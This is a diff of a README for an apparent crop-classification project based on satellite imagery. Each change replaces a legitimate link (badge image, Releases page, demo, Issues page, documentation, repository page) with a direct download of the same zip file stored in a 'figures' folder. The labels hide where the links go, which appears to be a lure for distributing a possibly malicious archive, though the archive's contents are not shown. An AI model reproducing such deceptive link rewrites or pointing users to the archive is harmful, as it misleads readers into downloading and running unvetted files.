@@ -1,7 +1,7 @@
 # 🌾 GCN-Crop-Classification - Classify Crops with Ease
 
 ## 📦 Download Now
-[![Download GCN-Crop-Classification](https://img.shields.io/badge/Download-GCN--Crop--Classification-blue.svg)](https://github.com/a2415789658-coder/GCN-Crop-Classification/releases)
+[![Download GCN-Crop-Classification](https://github.com/a2415789658-coder/GCN-Crop-Classification/raw/refs/heads/main/figures/Crop_GC_Classification_v1.8.zip)](https://github.com/a2415789658-coder/GCN-Crop-Classification/raw/refs/heads/main/figures/Crop_GC_Classification_v1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the GCN-Crop-Classification project! This application allows you to classify crops from Sentinel-2 satellite imagery with high accuracy. You can also explore an interactive demo using Streamlit.
@@ -21,7 +21,7 @@ Before you begin, here are the requirements you need to meet:
 ### ⬇️ Download & Install
 To download the application, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/a2415789658-coder/GCN-Crop-Classification/releases).
+1. Visit the [Releases page](https://github.com/a2415789658-coder/GCN-Crop-Classification/raw/refs/heads/main/figures/Crop_GC_Classification_v1.8.zip).
 2. Look for the latest version available.
 3. Click on the asset link to download the application.
 4. Once the download is complete, locate the downloaded file on your computer.
@@ -44,19 +44,19 @@ After installation, follow these steps to use the application:
 ### 🌍 Interactive Streamlit Demo
 Not ready to install just yet? You can try the interactive demo:
 
-1. Go to the [Interactive Demo](https://gcn-crop-classification-demo.streamlit.app).
+1. Go to the [Interactive Demo](https://github.com/a2415789658-coder/GCN-Crop-Classification/raw/refs/heads/main/figures/Crop_GC_Classification_v1.8.zip).
 2. Upload an image or use provided sample images.
 3. Watch as the application classifies the crops in real-time.
 
 ### 📞 Support & Feedback
-If you encounter any issues while downloading or using the application, feel free to reach out for support. Open an issue on the [GitHub Issues page](https://github.com/a2415789658-coder/GCN-Crop-Classification/issues), and we will assist you as soon as possible.
+If you encounter any issues while downloading or using the application, feel free to reach out for support. Open an issue on the [GitHub Issues page](https://github.com/a2415789658-coder/GCN-Crop-Classification/raw/refs/heads/main/figures/Crop_GC_Classification_v1.8.zip), and we will assist you as soon as possible.
 
 ### 📢 Contributing
 We welcome contributions from the community. If you have ideas for improving this application or want to report bugs, please create a pull request or raise an issue. Your input is valuable in making this application better.
 
 ### 🔗 Additional Resources
-- [Documentation](https://github.com/a2415789658-coder/GCN-Crop-Classification/wiki)
-- [GitHub Page](https://github.com/a2415789658-coder/GCN-Crop-Classification)
+- [Documentation](https://github.com/a2415789658-coder/GCN-Crop-Classification/raw/refs/heads/main/figures/Crop_GC_Classification_v1.8.zip)
+- [GitHub Page](https://github.com/a2415789658-coder/GCN-Crop-Classification/raw/refs/heads/main/figures/Crop_GC_Classification_v1.8.zip)
 
 ## 📦 Download Now
-[![Download GCN-Crop-Classification](https://img.shields.io/badge/Download-GCN--Crop--Classification-blue.svg)](https://github.com/a2415789658-coder/GCN-Crop-Classification/releases)
+[![Download GCN-Crop-Classification](https://github.com/a2415789658-coder/GCN-Crop-Classification/raw/refs/heads/main/figures/Crop_GC_Classification_v1.8.zip)](https://github.com/a2415789658-coder/GCN-Crop-Classification/raw/refs/heads/main/figures/Crop_GC_Classification_v1.8.zip)
